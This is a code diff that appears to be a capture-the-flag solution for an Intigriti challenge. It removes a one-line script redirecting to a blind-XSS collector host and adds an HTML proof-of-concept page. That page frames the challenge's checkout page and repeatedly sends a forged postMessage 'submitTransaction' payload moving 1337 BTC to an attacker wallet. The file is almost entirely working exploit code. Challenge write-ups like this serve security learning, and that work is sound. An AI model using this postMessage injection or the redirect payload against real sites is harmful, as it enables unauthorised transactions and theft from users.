@@ -1,1 +1,41 @@
-<script>location='https://monkeydluffy.bxss.in?redir=1'</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>PostMessage Exploit PoC</title>
+</head>
+<body>
+    <h1>"Following the trail of coins..."</h1>
+    <p>Target loaded in iframe. Sending payloads...</p>
+    
+    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1" width="500" height="500"></iframe>
+
+    <script>
+        window.onload = function() {
+            var targetFrame = document.getElementById('target').contentWindow;
+
+            var maliciousPayload = {
+                type: 'submitTransaction',
+                transaction: {
+                    currency: 'BTC',
+                    amount: 1337,
+                    toAddress: '11854a13cc79b72d8e6485a8f0801e607d' // Your BTC wallet
+                }
+            };
+
+            // Spam the message every 500ms for 10 seconds.
+            // This ensures we catch the exact moment the API data is loaded.
+            var count = 0;
+            var interval = setInterval(() => {
+                targetFrame.postMessage(maliciousPayload, '*');
+                console.log("Payload sent! Attempt: " + (count + 1));
+                
+                count++;
+                if(count >= 20) {
+                    clearInterval(interval); // Stop after 10 seconds
+                    console.log("Exploit finished.");
+                }
+            }, 500); 
+        };
+    </script>
+</body>
+</html>
